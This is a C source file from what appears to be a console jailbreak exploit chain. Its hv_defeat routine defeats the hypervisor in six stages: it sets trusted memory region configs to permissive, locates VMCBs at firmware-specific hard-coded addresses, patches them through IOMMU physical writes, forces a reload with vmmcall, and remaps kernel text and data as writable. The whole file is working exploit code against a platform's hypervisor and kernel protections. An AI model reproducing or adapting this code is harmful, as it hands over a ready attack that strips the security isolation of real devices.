#include "hv_defeat.h"
#include "config.h"
#include "gpu.h"
#include "iommu.h"
#include "tmr.h"
#include "utils.h"
#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <stddef.h>
#include <stdio.h>
#include <unistd.h>

uint64_t vmcb_pa[16];

int hv_defeat(void) {
  if (gpu_init())
    return -1;
  if (stage1_tmr_relax())
    return -1;
  if (stage2_find_vmcbs())
    return -1;
  iommu_selftest();
  if (stage3_patch_vmcbs())
    return -1;
  if (stage4_force_vmcb_reload())
    return -1;
  if (stage5_remove_xotext())
    return -1;
  if (stage6_kernel_pmap_invalidate_all())
    return -1;
  return 0;
}

int stage1_tmr_relax(void) {
  DEBUG_PRINT("\nHV-defeat [stage1] tmr relax: ");

  DEBUG_PRINT("Firmware version: %04x\n", fw);

  for (int t = 0; t < 22; t++) {
    uint32_t b = tmr_read(TMR_BASE(t));
    uint32_t l = tmr_read(TMR_LIMIT(t));
    uint32_t c = tmr_read(TMR_CONFIG(t));
    if (c == 0 && b == 0 && l == 0)
      continue;
    DEBUG_PRINT("  tmr[%02d] 0x%012lx-0x%012lx cfg=0x%08x\n", t,
                (uint64_t)b << 16, ((uint64_t)l << 16) | 0xFFFF, c);
  }

  if (fw < 0x0300) {
    tmr_write(TMR_CONFIG(16), TMR_CFG_PERMISSIVE);

    if (tmr_read(TMR_CONFIG(16)) != TMR_CFG_PERMISSIVE)
      goto no_ok;

  } else {
    tmr_write(TMR_CONFIG(5), TMR_CFG_PERMISSIVE);
    tmr_write(TMR_CONFIG(16), TMR_CFG_PERMISSIVE);
    tmr_write(TMR_CONFIG(17), TMR_CFG_PERMISSIVE);
    tmr_write(TMR_CONFIG(18), TMR_CFG_PERMISSIVE);

    if (tmr_read(TMR_CONFIG(5)) != TMR_CFG_PERMISSIVE)
      goto no_ok;
    if (tmr_read(TMR_CONFIG(16)) != TMR_CFG_PERMISSIVE)
      goto no_ok;
    if (tmr_read(TMR_CONFIG(17)) != TMR_CFG_PERMISSIVE)
      goto no_ok;
    if (tmr_read(TMR_CONFIG(18)) != TMR_CFG_PERMISSIVE)
      goto no_ok;
  }

  DEBUG_PRINT("OK\n");
  return 0;

no_ok:
  DEBUG_PRINT("No OK\n");
  return -1;
}

int stage2_find_vmcbs(void) {
  DEBUG_PRINT("\nHV-defeat [stage2] vmcb discovery\n");

  for (int c = 0; c < 16; c++) {
    vmcb_pa[c] = get_vmcb(c);
    DEBUG_PRINT("  core %02d: pa=0x%016lx\n", c, vmcb_pa[c]);
  }

  return 0;
}

uint64_t get_vmcb(int core) {
  switch (fw) {
  case 0x0300:
  case 0x0310:
  case 0x0320:
  case 0x0321:
    return (uint64_t)0x6290B000 + (uint64_t)core * 0x3000;
    break;
  case 0x0400:
  case 0x0402:
  case 0x0403:
  case 0x0450:
  case 0x0451:
    return (uint64_t)0x62A05000 + (uint64_t)core * 0x3000;
    break;
  default:
    return -1;
  }
}

int iommu_selftest(void) {
  DEBUG_PRINT("\n[iommu] self-test\n");

  uint64_t scratch = 0xAAAAAAAABBBBBBBBULL;
  uint64_t scratch_pa = vtophys_user((uint64_t)&scratch);

  if (!scratch_pa || scratch_pa >= 0x100000000ULL) {
    DEBUG_PRINT("  bad scratch PA 0x%016lx\n", scratch_pa);
    return -1;
  }

  uint64_t pattern = 0xDEADCAFE12345678ULL;
  DEBUG_PRINT("  scratch pa=0x%016lx before=0x%016lx\n", scratch_pa, scratch);

  iommu_write8_pa(scratch_pa, pattern);
  uint64_t readback = kread64(dmap + scratch_pa);

  DEBUG_PRINT("  wrote=0x%016lx read=0x%016lx %s\n", pattern, readback,
              (readback == pattern) ? "OK" : "FAIL");

  return (readback == pattern) ? 0 : -1;
}

int stage3_patch_vmcbs(void) {
  DEBUG_PRINT("\nHV-defeat [stage3-iommu] vmcb patch via IOMMU\n");

  int cur = sceKernelGetCurrentCpu();
  pin_to_core(cur);

  for (int i = 0; i < 16; i++) {
    uint64_t pa = vmcb_pa[i];

    iommu_write8_pa(pa + 0x00, 0x0000000000000000ULL);
    iommu_write8_pa(pa + 0x08, 0x0004000000000000ULL);
    iommu_write8_pa(pa + 0x10, 0x000000000000000FULL);
    iommu_write8_pa(pa + 0x58, 0x0000000000000001ULL);
    iommu_write8_pa(pa + 0x90, 0x0000000000000000ULL);

    DEBUG_PRINT("  vmcb[%2d] patched (pa=0x%016lx)\n", i, pa);

    usleep(1000);
  }

  pin_to_core(9);

  DEBUG_PRINT("  done, 16 cores\n");
  return 0;
}

static jmp_buf jmp_env;
static volatile int vmmcall_faulted = 0;

void handle_sigill(int sig) {
  vmmcall_faulted = 1;
  longjmp(jmp_env, 1);
}

int stage4_force_vmcb_reload(void) {
  int ret = 0;

  auto old_handler = signal(SIGILL, handle_sigill);

  for (int i = 0; i < 16; i++) {
    pin_to_core(i);
    vmmcall_faulted = 0;

    if (setjmp(jmp_env) == 0) {
      __asm__ volatile("vmmcall");
    }

    usleep(1000);
    DEBUG_PRINT("[vmmcall] core: %02d %s\n", i,
                vmmcall_faulted ? "SIGILL (caught)" : "ok");

    // Accumulate results
    ret |= vmmcall_faulted;
  }

  signal(SIGILL, old_handler);

  // Return -1 if we didn't caught them
  return ret ? 0 : -1;
}

int stage5_remove_xotext(void) {
  DEBUG_PRINT("\nHV-Defeat [stage5] xotext removal\n");

  uint64_t start = ktext;
  uint64_t end = kdata;
  int n __attribute__((unused)) = 0;

  for (uint64_t a = start; a < end; a += 0x1000) {
    page_chain_set_rw(a);
    n++;
  }
  DEBUG_PRINT("  %d pages on ktext\n", n);

  start = kdata;
  end = kdata + 0x08000000;
  n = 0;
  for (uint64_t a = start; a < end; a += 0x1000) {
    page_chain_set_rw(a);
    n++;
  }
  DEBUG_PRINT("  %d pages on kdata\n", n);
  return 0;
}

int stage6_kernel_pmap_invalidate_all(void) {
  DEBUG_PRINT("HV-Defeat [stage6] invalidate paging entries\n");

  static uint64_t two_zero_pages[PAGE_SIZE * 2] = {0};

  int pipe_fds[2];

  if (pipe2(pipe_fds, O_NONBLOCK)) {
    return -1;
  }

  if (write(pipe_fds[1], two_zero_pages, PAGE_SIZE * 2) < 0) {
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    return -1;
  }

  close(pipe_fds[1]);

  uint64_t read_fd_file_data = kernel_get_proc_file(-1, pipe_fds[0]);

  if (!INKERNEL(read_fd_file_data)) {
    close(pipe_fds[0]);
    return -1;
  }

  uint64_t read_fd_buffer;
  kernel_copyout(read_fd_file_data + 0x10, &read_fd_buffer,
                 sizeof(read_fd_buffer));

  if (!INKERNEL(read_fd_buffer)) {
    close(pipe_fds[0]);
    return -1;
  }

  if (!page_remove_global(read_fd_buffer)) {
    close(pipe_fds[0]);
    return -1;
  }

  close(pipe_fds[0]);
  return 0;
}
